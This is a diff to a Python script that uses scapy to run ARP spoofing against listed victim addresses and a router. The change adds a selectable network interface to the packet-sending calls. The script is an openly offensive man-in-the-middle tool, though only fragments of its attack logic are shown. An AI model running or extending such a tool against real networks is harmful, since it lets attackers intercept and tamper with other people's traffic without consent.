@@ -5,9 +5,10 @@ import sys
 import scapy.all as scapy
 import os
 
+iface = None
+
 # MAC address function which will return
-# the mac_address of the provided ip address
- 
+# the mac_address of the provided ip address 
 def get_mac(ip):
     # creating an ARP request to the ip address
     arp_request = scapy.ARP(pdst=ip)
@@ -18,7 +19,7 @@ def get_mac(ip):
      
     # return a list of MAC addresses with respective
     # MAC addresses and IP addresses.
-    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=iface)[0]
     if answ:
         # we choose the first MAC address and select
         # the MAC address using the field hwsrc
@@ -41,7 +42,7 @@ def arp_spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
  
 
-def arp_main(silent, manual, router):
+def arp_main(silent, manual, router, input_iface):
     # TOADD: 
     # - arguments: silent/allin, autoscan/manualinput, dns things, input for all addresses
     # - threads
@@ -50,6 +51,8 @@ def arp_main(silent, manual, router):
     # router_ip = input()  # taking the router ip address
     victim_addresses = manual
     router_ip = router
+    global iface 
+    iface = input_iface
     sent_packets_count = 0  # initializing the packet counter
 
     while True:
